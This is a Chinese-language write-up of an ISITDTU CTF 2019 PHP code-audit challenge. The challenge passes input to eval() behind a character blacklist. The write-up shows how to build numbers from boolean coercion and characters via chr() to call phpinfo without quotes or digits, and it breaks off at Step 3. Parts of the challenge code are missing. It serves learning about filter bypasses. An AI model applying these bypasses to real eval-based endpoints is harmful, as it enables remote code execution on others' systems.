在 ISITDTU CTF 2019 上做了一道比较有意思的代码审计题，主要应用了 php 异或等操作进行
getshell，收获还是挺多的。最近越来越喜欢看这种代码简单，但是又蕴含玄机的东西了...
# Description
> ​ Don't try to run any Linux command, just use all the PHP functions you
> know to get the flag
     0xd )
        die('you are so close, omg');
    eval($_);
    ?>
# Write Up
## Explation
题目代码比较简单，首先看看第一个正则：
再看看第二个过滤，`strtolower`将字符串转换为小写，用`count_chars`返回由所有使用了的字节值组成的字符串，再判断其中每个字符累计出现次数是否大于
13
## Doing
### Step 1
既然正则约束了比较多的条件，自然我们首先得看看还有哪些可用的。
     $value) {
        if ( preg_match('/[\x00- 0-9\'"`$&.,|[{_defgops\x7F]+/i', $value) ){
            unset($arr[$key]);
            continue;
        }
        if ( strlen(count_chars(strtolower($value), 0x3)) > 0xd ){
            unset($arr[$key]);
            continue;
        }
    }
    var_dump($arr);
    ?>
得到还剩下以下内置函数可用：
    array(15) {
      [206]=>
      string(5) "bcmul"
      [1060]=>
      string(5) "rtrim"
      [1066]=>
      string(4) "trim"
      [1067]=>
      string(5) "ltrim"
      [1078]=>
      string(3) "chr"
      [1102]=>
      string(4) "link"
      [1103]=>
      string(6) "unlink"
      [1146]=>
      string(3) "tan"
      [1149]=>
      string(4) "atan"
      [1150]=>
      string(5) "atanh"
      [1154]=>
      string(4) "tanh"
      [1255]=>
      string(6) "intval"
      [1403]=>
      string(4) "mail"
      [1444]=>
      string(3) "min"
      [1445]=>
      string(3) "max"
    }
这样这题看起来与国赛那个 Love_Math 题目就有点类似了，看起来`intval`跟`chr`貌似有点搞头，但是数字却又被 ban
掉了…那我们就只能另寻他路了...
### Step 2
虽然双引号跟单引号都被 ban 掉了，但是我们知道 php 在获取 HTTP GET 参数的时候默认是获得到了字符串类型，所以即使双引号跟单引号被 ban
了其实并没有太大的影响。而我们还可以知道，字符串还可以用`!`操作符来进行布尔类型的转换，如下：
    php > var_dump(!a);
    PHP Notice:  Use of undefined constant a - assumed 'a' in php shell code on line 1
    bool(false)
    php > var_dump(!!a);
    PHP Notice:  Use of undefined constant a - assumed 'a' in php shell code on line 1
    bool(true)
可以再加一个`@`忽略 notice 输出
    <?php
    var_dump(@a);       //string(1) "a"
    var_dump(!@a);  //bool(false)
    var_dump(!!@a); //bool(true)
而对 bool 类型使用加法的时候， php 则会将 bool 类型处理为数字，`true` 转换为 1 ， `false` 为 0
，所以我们又可以利用这一点来实现数字计算：
    <?php
    var_dump(!!@a + !!@a);  //int(2) 1+1
    var_dump((!!@a + !!@a) * (!!@a + !!@a + !!@a + !!@a));  //int(6) (1+1)*(1+1+0+1)
所以，这样大概我们就可以利用`chr()`进行数字转换得到字符了，并且我们还可以利用`"phpinfo"()`的特性，通过字符串拼凑，可以得到
phpinfo:
    (chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a  + !!@a + !!@a))
    .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a  + !!@a + !!@a + !!@a  + !!@a ))
    .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a  + !!@a + !!@a))
    .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a  + !!@a + !!@a + !!@a  + !!@a ) + !!@a)
    .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) * ((!!@a + !!@a  + !!@a) ** (!!@a + !!@a) ))
    .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a + !!@a + !!@a ) * (!!@a + !!@a  + !!@a + !!@a + !!@a  + !!@a ) - !!@a - !!@a)
    .chr((!!@a + !!@a) ** (!!@a + !!@a + !!@a + !!@a + !!@a + !!@a + !!@a) - (!!@a + !!@a) ** (!!@a + !!@a  + !!@a + !!@a) - !!@a))();
但是这里要需要用到`.`进行字符串拼接，然而`.`又被 ban 掉了，所以我们得另寻他路
### Step 3